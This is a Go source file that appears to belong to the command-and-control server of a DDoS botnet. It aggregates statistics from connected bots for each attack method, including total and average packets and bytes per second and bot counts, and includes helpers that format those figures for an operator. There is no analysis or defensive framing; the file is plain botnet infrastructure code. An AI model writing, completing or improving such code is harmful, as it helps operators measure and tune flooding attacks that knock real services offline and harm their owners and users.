package main
import (
    "fmt"
    "sync"
    "time"
)
type MethodStats struct {
    MethodID    uint8
    MethodName  string
    TotalPPS    uint64
    TotalBPS    uint64
    BotCount    int
    AvgPPS      uint64
    AvgBPS      uint64
}
type StatsCollector struct {
    mu          sync.RWMutex
    methodStats map[uint8]*MethodStats
    lastUpdate  time.Time
}
var globalStats *StatsCollector = &StatsCollector{
    methodStats: make(map[uint8]*MethodStats),
}
func (sc *StatsCollector) Update() {
    sc.mu.Lock()
    defer sc.mu.Unlock()
    for k := range sc.methodStats {
        sc.methodStats[k].TotalPPS = 0
        sc.methodStats[k].TotalBPS = 0
        sc.methodStats[k].BotCount = 0
    }
    bots := clientList.GetBots()
    for _, bot := range bots {
        stats := bot.GetStats()
        for methodID, attackStats := range stats {
            if _, exists := sc.methodStats[methodID]; !exists {
                methodName := getMethodName(methodID)
                sc.methodStats[methodID] = &MethodStats{
                    MethodID:   methodID,
                    MethodName: methodName,
                }
            }
            ms := sc.methodStats[methodID]
            ms.TotalPPS += attackStats.PPS
            ms.TotalBPS += attackStats.BPS
            ms.BotCount++
        }
    }
    for _, ms := range sc.methodStats {
        if ms.BotCount > 0 {
            ms.AvgPPS = ms.TotalPPS / uint64(ms.BotCount)
            ms.AvgBPS = ms.TotalBPS / uint64(ms.BotCount)
        }
    }
    sc.lastUpdate = time.Now()
}
func (sc *StatsCollector) GetMethodStats(methodID uint8) *MethodStats {
    sc.mu.RLock()
    defer sc.mu.RUnlock()
    if ms, exists := sc.methodStats[methodID]; exists {
        return &MethodStats{
            MethodID:   ms.MethodID,
            MethodName: ms.MethodName,
            TotalPPS:   ms.TotalPPS,
            TotalBPS:   ms.TotalBPS,
            BotCount:   ms.BotCount,
            AvgPPS:     ms.AvgPPS,
            AvgBPS:     ms.AvgBPS,
        }
    }
    return nil
}
func (sc *StatsCollector) GetAllStats() map[uint8]*MethodStats {
    sc.mu.RLock()
    defer sc.mu.RUnlock()
    result := make(map[uint8]*MethodStats)
    for k, v := range sc.methodStats {
        result[k] = &MethodStats{
            MethodID:   v.MethodID,
            MethodName: v.MethodName,
            TotalPPS:   v.TotalPPS,
            TotalBPS:   v.TotalBPS,
            BotCount:   v.BotCount,
            AvgPPS:     v.AvgPPS,
            AvgBPS:     v.AvgBPS,
        }
    }
    return result
}
func getMethodName(methodID uint8) string {
    for name, info := range attackInfoLookup {
        if info.attackID == methodID {
            return name
        }
    }
    return fmt.Sprintf("unknown_%d", methodID)
}
func formatBytes(bytes uint64) string {
    if bytes < 1024 {
        return fmt.Sprintf("%d B", bytes)
    } else if bytes < 1024*1024 {
        return fmt.Sprintf("%.2f KB", float64(bytes)/1024)
    } else if bytes < 1024*1024*1024 {
        return fmt.Sprintf("%.2f MB", float64(bytes)/(1024*1024))
    } else {
        return fmt.Sprintf("%.2f GB", float64(bytes)/(1024*1024*1024))
    }
}
func formatPPS(pps uint64) string {
    if pps < 1000 {
        return fmt.Sprintf("%d", pps)
    } else if pps < 1000000 {
        return fmt.Sprintf("%.2fK", float64(pps)/1000)
    } else {
        return fmt.Sprintf("%.2fM", float64(pps)/1000000)
    }
}
